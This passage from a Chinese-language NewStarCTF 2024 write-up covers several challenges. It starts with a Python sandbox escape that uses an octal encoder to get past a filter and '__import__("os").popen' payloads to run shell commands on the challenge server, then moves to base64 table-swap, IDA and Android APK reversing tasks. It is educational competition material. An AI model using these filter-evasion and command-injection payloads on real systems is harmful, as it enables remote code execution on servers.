<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/msedge_KgYgISUUnJ.png"></p>
<p>所以接下来调用<code>__builtins__.eval</code>就可以了，先写一个字符串转八进制的工具</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    data = <span class="built_in">input</span>(<span class="string">&quot;Your code: &quot;</span>)</span><br><span class="line">    payload = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> data:</span><br><span class="line">        payload += <span class="built_in">oct</span>(<span class="built_in">ord</span>(char)).replace(<span class="string">&quot;0o&quot;</span>, <span class="string">&quot;\\&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure>

<p>然后就开始玩了，我先尝试查找flag的位置，使用的linux命令为<code>find / -iname &quot;flag&quot;</code>，但是要使用os命令还需要import一下，所以我的命令应该是这样的</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).popen(<span class="string">&quot;find / -iname &#x27;flag&#x27;&quot;</span>).read()</span><br></pre></td></tr></table></figure>

<p>变成八进制编码为<code>\137\137\151\155\160\157\162\164\137\137\50\42\157\163\42\51\56\160\157\160\145\156\50\42\146\151\156\144\40\57\40\55\151\156\141\155\145\40\47\146\154\141\147\47\42\51\56\162\145\141\144\50\51</code>，POST出去能发现flag的位置为<code>/flag</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/msedge_MSVVvPASpO.png"></p>
<p>那就改下命令，使用</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).popen(<span class="string">&quot;cat /flag&quot;</span>).read()</span><br></pre></td></tr></table></figure>

<p>读取出来就能得到flag了，为<code>flag&#123;392252c7-0ca5-4e76-bbd2-1000ab6f616a&#125;</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/msedge_D2La2vjJsv.png"></p>
<h2 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h2><h3 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h3><blockquote>
<p>仍然是base64</p>
<p>【难度：简单】</p>
</blockquote>
<p>通过xdbg动态调试可以发现里面的一些字符串</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/x64dbg_j0zI0klUYK.png"></p>
<p>上面的应该是提示，下面的这部分是在输入flag后进行比较的部分，但是经过动态调试，它用于比较的值并不是我们输入的flag经过b64编码，而是固定为<code>j4AvAcBkn6LduUAkhDBd5YBDI2ATc=</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/x64dbg_Hvn5GcPcED.png"></p>
<p>经过字符串查找我们现在有两段可能有用的内容</p>
<ul>
<li>WHydo3sThiS7ABLElO0k5trange+CZfVIGRvup81NKQbjmPzU4MDc9Y6q2XwFxJ&#x2F;</li>
<li>g84Gg6m2ATtVeYqUZ9xRnaBpBvOVZYtj+Tc&#x3D;</li>
</ul>
<p>还有一段固定比较的内容</p>
<ul>
<li>j4AvAcBkn6LduUAkhDBd5YBDI2ATc&#x3D;</li>
</ul>
<p>其中，第一段内容前面应该是<code>Why do this table look strange</code>，应该是提示我们换表了</p>
<p>我在这里先尝试把表弄出来，进行了几个字符串的编码，在汇编中还可以看到对flag进行b64编码后换表的操作前要求我们输入的长度为26</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/x64dbg_218EAZt0h0.png"></p>
<p>所以我分别用<code>abcdefghijklmnopqrstuvwxyz</code>、<code>12345678901234567890123456</code>、<code>qwertyuiopasdfghjklzxcvbnm</code>、<code>!@#$%^&amp;*()!@#$%^&amp;*()!@#$%^</code>、<code>1/2*3-4+5/6*7-8+9-/0/00000</code>进行base64编码和丢进这个程序里进行编码，得到了下面的几个字符串</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">original_strings = [</span><br><span class="line">    <span class="string">&quot;YWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXo=&quot;</span>,</span><br><span class="line">    <span class="string">&quot;MTIzNDU2Nzg5MDEyMzQ1Njc4OTAxMjM0NTY=&quot;</span>,</span><br><span class="line">    <span class="string">&quot;cXdlcnR5dWlvcGFzZGZnaGprbHp4Y3Zibm0=&quot;</span>,</span><br><span class="line">    <span class="string">&quot;IUAjJCVeJiooKSFAIyQlXiYqKCkhQCMkJV4=&quot;</span>,</span><br><span class="line">    <span class="string">&quot;MS8yKjMtNCs1LzYqNy04KzktLzAvMDAwMDA=&quot;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">mapped_strings = [</span><br><span class="line">    <span class="string">&quot;nrivgst8gYGKe8mj+r2zCT3MC6O9Z1ZqfaN=&quot;</span>,</span><br><span class="line">    <span class="string">&quot;AkhDBd5YBDI2AdoMADl9BvCqLkW4AvAcBkn=&quot;</span>,</span><br><span class="line">    <span class="string">&quot;CaZpC1O2ZrpzCs3Dgsg1esKb+TKqn6gR+8c=&quot;</span>,</span><br><span class="line">    <span class="string">&quot;h5WviytfiRNNS03WhMlpaRnQSyuGlyAuitq=&quot;</span>,</span><br><span class="line">    <span class="string">&quot;A0FMSvAmByj97DnQBMcqSDum7DWzAdWUAdW=&quot;</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p>然后通过Python算一下映射关系，得到映射关系如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">Y: n</span><br><span class="line">W: r</span><br><span class="line">J: i</span><br><span class="line">j: v</span><br><span class="line">Z: g</span><br><span class="line">G: s</span><br><span class="line">V: t</span><br><span class="line">m: <span class="number">8</span></span><br><span class="line"><span class="number">2</span>: Y</span><br><span class="line">h: G</span><br><span class="line">p: K</span><br><span class="line">a: e</span><br><span class="line">t: m</span><br><span class="line">s: j</span><br><span class="line">b: +</span><br><span class="line"><span class="number">5</span>: <span class="number">2</span></span><br><span class="line">v: z</span><br><span class="line">c: C</span><br><span class="line">H: T</span><br><span class="line">F: <span class="number">3</span></span><br><span class="line">y: M</span><br><span class="line"><span class="number">3</span>: <span class="number">6</span></span><br><span class="line">R: O</span><br><span class="line"><span class="number">1</span>: <span class="number">9</span></span><br><span class="line">d: Z</span><br><span class="line">n: <span class="number">1</span></span><br><span class="line"><span class="number">4</span>: q</span><br><span class="line">e: f</span><br><span class="line">X: a</span><br><span class="line">o: N</span><br><span class="line">=: =</span><br><span class="line">M: A</span><br><span class="line">T: k</span><br><span class="line">I: h</span><br><span class="line">z: D</span><br><span class="line">N: B</span><br><span class="line">D: d</span><br><span class="line">U: <span class="number">5</span></span><br><span class="line">g: I</span><br><span class="line">E: o</span><br><span class="line">Q: l</span><br><span class="line">O: L</span><br><span class="line">A: W</span><br><span class="line">x: <span class="number">4</span></span><br><span class="line"><span class="number">0</span>: c</span><br><span class="line">l: p</span><br><span class="line">r: b</span><br><span class="line">i: R</span><br><span class="line">C: y</span><br><span class="line">K: S</span><br><span class="line">S: <span class="number">0</span></span><br><span class="line">q: Q</span><br><span class="line">k: u</span><br><span class="line"><span class="number">8</span>: F</span><br><span class="line">L: <span class="number">7</span></span><br><span class="line">w: U</span><br></pre></td></tr></table></figure>

<p>然后就可以通过Python写代码映射并解码了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">mapping = &#123;</span><br><span class="line">    <span class="string">&#x27;Y&#x27;</span>: <span class="string">&#x27;n&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;W&#x27;</span>: <span class="string">&#x27;r&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;J&#x27;</span>: <span class="string">&#x27;i&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;j&#x27;</span>: <span class="string">&#x27;v&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Z&#x27;</span>: <span class="string">&#x27;g&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;G&#x27;</span>: <span class="string">&#x27;s&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;V&#x27;</span>: <span class="string">&#x27;t&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;m&#x27;</span>: <span class="string">&#x27;8&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;2&#x27;</span>: <span class="string">&#x27;Y&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;h&#x27;</span>: <span class="string">&#x27;G&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;p&#x27;</span>: <span class="string">&#x27;K&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;a&#x27;</span>: <span class="string">&#x27;e&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;t&#x27;</span>: <span class="string">&#x27;m&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;s&#x27;</span>: <span class="string">&#x27;j&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;b&#x27;</span>: <span class="string">&#x27;+&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;5&#x27;</span>: <span class="string">&#x27;2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;v&#x27;</span>: <span class="string">&#x27;z&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;c&#x27;</span>: <span class="string">&#x27;C&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;H&#x27;</span>: <span class="string">&#x27;T&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;F&#x27;</span>: <span class="string">&#x27;3&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;y&#x27;</span>: <span class="string">&#x27;M&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;3&#x27;</span>: <span class="string">&#x27;6&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;R&#x27;</span>: <span class="string">&#x27;O&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;1&#x27;</span>: <span class="string">&#x27;9&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;d&#x27;</span>: <span class="string">&#x27;Z&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;n&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;4&#x27;</span>: <span class="string">&#x27;q&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;e&#x27;</span>: <span class="string">&#x27;f&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;X&#x27;</span>: <span class="string">&#x27;a&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;o&#x27;</span>: <span class="string">&#x27;N&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;=&#x27;</span>: <span class="string">&#x27;=&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;M&#x27;</span>: <span class="string">&#x27;A&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;T&#x27;</span>: <span class="string">&#x27;k&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;I&#x27;</span>: <span class="string">&#x27;h&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;z&#x27;</span>: <span class="string">&#x27;D&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;N&#x27;</span>: <span class="string">&#x27;B&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;D&#x27;</span>: <span class="string">&#x27;d&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;U&#x27;</span>: <span class="string">&#x27;5&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;g&#x27;</span>: <span class="string">&#x27;I&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;E&#x27;</span>: <span class="string">&#x27;o&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Q&#x27;</span>: <span class="string">&#x27;l&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;O&#x27;</span>: <span class="string">&#x27;L&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;A&#x27;</span>: <span class="string">&#x27;W&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;x&#x27;</span>: <span class="string">&#x27;4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;0&#x27;</span>: <span class="string">&#x27;c&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;l&#x27;</span>: <span class="string">&#x27;p&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;r&#x27;</span>: <span class="string">&#x27;b&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;i&#x27;</span>: <span class="string">&#x27;R&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;C&#x27;</span>: <span class="string">&#x27;y&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;K&#x27;</span>: <span class="string">&#x27;S&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;S&#x27;</span>: <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;q&#x27;</span>: <span class="string">&#x27;Q&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;k&#x27;</span>: <span class="string">&#x27;u&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;8&#x27;</span>: <span class="string">&#x27;F&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;L&#x27;</span>: <span class="string">&#x27;7&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;w&#x27;</span>: <span class="string">&#x27;U&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 逆映射</span></span><br><span class="line">inverse_mapping = &#123;v: k <span class="keyword">for</span> k, v <span class="keyword">in</span> mapping.items()&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 题目提供的字符串</span></span><br><span class="line">b64_mapped = <span class="string">&quot;g84Gg6m2ATtVeYqUZ9xRnaBpBvOVZYtj+Tc=&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 进行逆映射</span></span><br><span class="line">reversed_string = <span class="string">&#x27;&#x27;</span>.join(inverse_mapping.get(char, char) <span class="keyword">for</span> char <span class="keyword">in</span> b64_mapped)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 进行 Base64 解码</span></span><br><span class="line">decoded_bytes = base64.b64decode(reversed_string)</span><br><span class="line">decoded_string = decoded_bytes.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出结果</span></span><br><span class="line"><span class="built_in">print</span>(decoded_string)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>然后跑出来结果是<code>flag&#123;y0uUkn0w\base64Uwell&#125;</code>，很奇怪，CTF题目分割字符的时候用的是下划线，这里有<code>U</code>和<code>\</code>，我想到应该是我的映射关系建立得不完全，手动把<code>U</code>和<code>\</code>改为下划线变成<code>flag&#123;y0u_kn0w_base64_well&#125;</code>后提交，成功！</p>
<h4 id="马后炮环节"><a href="#马后炮环节" class="headerlink" title="马后炮环节"></a>马后炮环节</h4><p>完赛后发现这题其实是base64换表的题目，上面那个<code>WHydo3sThiS7ABLElO0k5trange+CZfVIGRvup81NKQbjmPzU4MDc9Y6q2XwFxJ/</code>就是新的b64编码表</p>
<p>补一个换表解码脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="comment"># Original Table</span></span><br><span class="line">ORIGIN_TABLE = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line"><span class="comment"># New Table</span></span><br><span class="line">NEW_TABLE = <span class="string">&quot;WHydo3sThiS7ABLElO0k5trange+CZfVIGRvup81NKQbjmPzU4MDc9Y6q2XwFxJ/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Build Mapping</span></span><br><span class="line">MAPPING = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> index <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">    MAPPING[NEW_TABLE[index]] = ORIGIN_TABLE[index]</span><br><span class="line"></span><br><span class="line"><span class="comment"># String to decode</span></span><br><span class="line">string = <span class="string">&quot;g84Gg6m2ATtVeYqUZ9xRnaBpBvOVZYtj+Tc=&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Transform the string to real b64 table</span></span><br><span class="line">new_string = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> string:</span><br><span class="line">    <span class="keyword">if</span> char != <span class="string">&quot;=&quot;</span>: </span><br><span class="line">        new_string += MAPPING[char]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        new_string += <span class="string">&quot;=&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    decoded_bytes = base64.b64decode(new_string)</span><br><span class="line">    <span class="built_in">print</span>(decoded_bytes.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Error decoding base64:&quot;</span>, e)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="begin"><a href="#begin" class="headerlink" title="begin"></a>begin</h3><blockquote>
<p>什么是IDA？</p>
<p>【难度：签到】</p>
</blockquote>
<p>描述提示我们用IDA打开，按下<kbd>F5</kbd>后会看到这个main函数里给了很多提示</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/ida64_SaiKwd310v.png"></p>
<h4 id="第一部分"><a href="#第一部分" class="headerlink" title="第一部分"></a>第一部分</h4><p>在Hex-view视图中，我们可以看到第一部分flag的内容为<code>flag&#123;Mak3_aN_</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/ida64_YyjKHcnh88.png"></p>
<p>按照题目给的提示，我们在IDA-View里面按下<kbd>A</kbd>也能够直接转换出来</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/ida64_uv8fWeSoyn.png"></p>
<h4 id="第二部分"><a href="#第二部分" class="headerlink" title="第二部分"></a>第二部分</h4><p>按照题目提示，我们按下<kbd>Shift</kbd>+<kbd>F12</kbd>转换到Strings视图就可以看到了，为<code>3Ff0rt_tO_5eArcH_</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/ida64_lWSxPE8U11.png"></p>
<h4 id="第三部分"><a href="#第三部分" class="headerlink" title="第三部分"></a>第三部分</h4><p>题目说按下<kbd>X</kbd>键，但其实我是在IDA-View里面找到的，直接双击题目给我们提示第三部分的那一行，然后就能看到了，为<code>F0r_th3_f14g_C0Rpse</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/ida64_mnI53MS3bT.png"></p>
<p>所有最后结果为<code>flag&#123;Mak3_aN_3Ff0rt_tO_5eArcH_F0r_th3_f14g_C0Rpse&#125;</code></p>
<h3 id="ezAndroidStudy"><a href="#ezAndroidStudy" class="headerlink" title="ezAndroidStudy"></a>ezAndroidStudy</h3><blockquote>
<p>这是什么?猫猫虫?</p>
<p>【难度：简单】</p>
</blockquote>
<p>在<code>resources.arsc</code>可以查到flag2和flag4的属性</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">public</span> <span class="attr">type</span>=<span class="string">&quot;string&quot;</span> <span class="attr">name</span>=<span class="string">&quot;flag2&quot;</span> <span class="attr">id</span>=<span class="string">&quot;0x7f12003a&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">public</span> <span class="attr">type</span>=<span class="string">&quot;raw&quot;</span> <span class="attr">name</span>=<span class="string">&quot;flag4&quot;</span> <span class="attr">id</span>=<span class="string">&quot;0x7f110000&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="第二段flag"><a href="#第二段flag" class="headerlink" title="第二段flag"></a>第二段flag</h4><p>找到<code>/res/values/strings.xml</code>搜索<code>flag2</code>可以得到<code>flag2</code>为<code>_@r4</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/javaw_FWJPJDKJD0.png"></p>
<h4 id="第四段flag"><a href="#第四段flag" class="headerlink" title="第四段flag"></a>第四段flag</h4><p>找到<code>res/raw</code>下发现<code>flag4.txt</code>，得到<code>flag4</code>为<code>_andr01d</code></p>
<h4 id="提示"><a href="#提示" class="headerlink" title="提示"></a>提示</h4><p>然后在<code>res/values/strings.xml</code>里面发现提示</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">string</span> <span class="attr">name</span>=<span class="string">&quot;fab_transformation_sheet_behavior&quot;</span>&gt;</span>com.google.android.material.transformation.FabTransformationSheetBehavior<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">string</span> <span class="attr">name</span>=<span class="string">&quot;fifth&quot;</span>&gt;</span>安卓卓用到的可不只有 java 呢，你知道怎么逆向安卓的 so 文件吗喵<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">string</span> <span class="attr">name</span>=<span class="string">&quot;fifth_fragment_label&quot;</span>&gt;</span>Session5 : Native code<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">string</span> <span class="attr">name</span>=<span class="string">&quot;first&quot;</span>&gt;</span>一个 Activity 就是一个页面呢，每一次页面切换，就是 Activity 的切换。问题来了，我们怎么才能知道一个软件有哪些 Activity 呢？答案啊，是查找 AndroidManifest.xml 文件里的 Activity 标签呢，你能在 Activity 里找到第一段 flag 吗喵？<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">string</span> <span class="attr">name</span>=<span class="string">&quot;first_fragment_label&quot;</span>&gt;</span>Session1: Activity<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">string</span> <span class="attr">name</span>=<span class="string">&quot;flag2&quot;</span>&gt;</span>flag2: _@r4<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">string</span> <span class="attr">name</span>=<span class="string">&quot;fourth&quot;</span>&gt;</span>你知道吗？apk 中不用编译的资源(一下其他类型的文件)通常放在 /assets 目录和 /res/raw 目录下呢，你能找到第四段 flag 吗喵？(悄悄告诉你，这个比赛很容易考到呢)<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">string</span> <span class="attr">name</span>=<span class="string">&quot;fourth_fragment_label&quot;</span>&gt;</span>Session4: Raw Res<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="第一段flag"><a href="#第一段flag" class="headerlink" title="第一段flag"></a>第一段flag</h4><p>在<code>AndroidManifest.xml</code>里面，我们可以看到第一个定义的activity</p>
